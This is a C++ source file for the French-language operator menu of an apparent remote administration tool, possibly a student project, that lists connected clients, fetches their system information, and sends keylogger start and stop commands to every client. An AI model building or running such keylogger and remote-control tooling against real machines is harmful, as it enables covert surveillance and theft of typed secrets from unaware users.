#include "Menu.hpp"

Menu::Menu(std::vector<std::unique_ptr<LPTF_Socket>>& clients)
    : clients(clients) {}

// Run the menu loop; returns the selected exit code
int Menu::run() {
    while (true) {
        showOptions();
        int choice = getChoice();
        if (choice == 9) {
            std::cout << "Fermeture du serveur..." << std::endl;
            return 0;
        }
        handleChoice(choice);
        // Pause until user presses Enter
        waitNext();
    }
}

// Displays the menu options to the user
void Menu::showOptions() {
    std::cout << "-------------------------------------" << std::endl;
    std::cout << "Nombre de clients connectés : " << clients.size() << std::endl;
    std::cout << "1 - Afficher la liste des clients" << std::endl;
    std::cout << "2 - Envoyer un message au client" << std::endl;
    std::cout << "3 - Afficher les informations du client" << std::endl;
    std::cout << "4 - Démarrer le keylogger" << std::endl;
    std::cout << "5 - Eteindre le keylogger" << std::endl;
    std::cout << "6 - Afficher la liste complète des processus" << std::endl;
    std::cout << "7 - Afficher la liste des processus (noms)" << std::endl;
    std::cout << "8 - Exécuter une commande" << std::endl;
    std::cout << "9 - Quitter" << std::endl;
}

// Gets the user's choice from the menu
int Menu::getChoice() {
    int choice;
    std::cout << "Choisissez une option : ";
    std::cin >> choice;
    // Discard rest of line
    std::cin.ignore(std::numeric_limits<std::streamsize>::max(), '\n');
    return choice;
}

// Handles the user's choice from the menu
void Menu::handleChoice(int choice) {
    ProcessLister lister;
    switch (choice) {
        case 1:
            std::cout << "Clients connectés:" << std::endl;
            for (size_t i = 0; i < clients.size(); ++i) {
                std::cout << i << ": " << clients[i]->getClientIP() << std::endl;
            }
            break;
        case 2:
            std::cout << "Option 2 sélectionnée: Envoyer un message au client" << std::endl;
            break;
        case 3: {
            std::cout << "Récupération des informations système du client:" << std::endl;
            for (size_t i = 0; i < clients.size(); ++i) {
                std::cout << i << " - " << clients[i]->getClientIP() << std::endl;
            }
            std::cout << "Choisissez le client: ";
            int idx;
            std::cin >> idx;
            std::cin.ignore(std::numeric_limits<std::streamsize>::max(), '\n');
            if (idx < 0 || idx >= static_cast<int>(clients.size())) {
                std::cout << "Index de client invalide." << std::endl;
                break;
            }
            // Send GET_INFO request to client
            LPTF_Packet request(1, PacketType::GET_INFO, 0, 1, 1, {});
            clients[idx]->sendBinary(request.serialize());
            // Receive response from client
            auto data = clients[idx]->recvBinary();
            auto packet = LPTF_Packet::deserialize(data);
            std::string payload(packet.getPayload().begin(), packet.getPayload().end());
            std::cout << "=== Informations système du client ===" << std::endl;
            std::cout << payload << std::endl;
            std::cout << "=======================================" << std::endl;
            break;
        }
        case 4: {
            std::cout << "Option 4 sélectionnée: Démarrer le keylogger" << std::endl;
            // Send start command for keylogger
            std::string cmdStart = "start";
            std::vector<uint8_t> startPayload(cmdStart.begin(), cmdStart.end());
            LPTF_Packet request(1, PacketType::KEYLOG, 0, 1, 1, startPayload);
            for (const auto& client : clients) {
                client->sendBinary(request.serialize());
            }
            std::cout << "Keylogger démarré sur le client." << std::endl;
            break;
        }
        case 5: {
            std::cout << "Option 5 sélectionnée: Eteindre le keylogger" << std::endl;
            // Send stop command for keylogger
            std::string cmdStop = "stop";
            std::vector<uint8_t> stopPayload(cmdStop.begin(), cmdStop.end());
            LPTF_Packet stopRequest(1, PacketType::KEYLOG, 0, 1, 1, stopPayload);
            for (const auto& client : clients) {
                client->sendBinary(stopRequest.serialize());
            }
            std::cout << "Keylogger arrêté sur le client." << std::endl;
            break;
        }
        case 6: {
            std::cout << "Processus sur le client:" << std::endl;
            if (!lister.listProcesses()) {
                std::cout << "Erreur: impossible de lister les processus." << std::endl;
            }
            break;
        }
        case 7: {
            std::cout << "Processus listés par .exe:" << std::endl;
            {
                auto exes = lister.getExeList();
                const int columns = 5;
                int count = 0;
                for (const auto& exe : exes) {
                    std::cout << std::left << std::setw(25) << exe;
                    if (++count % columns == 0)
                        std::cout << std::endl;
                }
                if (count % columns != 0) std::cout << std::endl;
            }
            break;
        }
        case 8:
            std::cout << "Option 8 sélectionnée: Exécuter une commande" << std::endl;
            break;
        case 9:
            std::cout << "Fermeture du serveur..." << std::endl;
            exit(0); // Exit the program
            break;
        default: {
            // If cin has failed, clear the error and discard the bad input
            if (!std::cin) {
                std::cin.clear();
                std::cin.ignore(std::numeric_limits<std::streamsize>::max(), '\n');
            }
            std::cout << "Entrée invalide, veuillez entrer un nombre valide." << std::endl;
            break;
        }
        std::cout << "Option invalide, veuillez réessayer." << std::endl;
        break;
    }
}

// Pause and wait for user to press Enter
void Menu::waitNext() {
    std::cout << "\nAppuyez sur Entrée pour continuer...";
    std::cin.ignore(std::numeric_limits<std::streamsize>::max(), '\n');
}
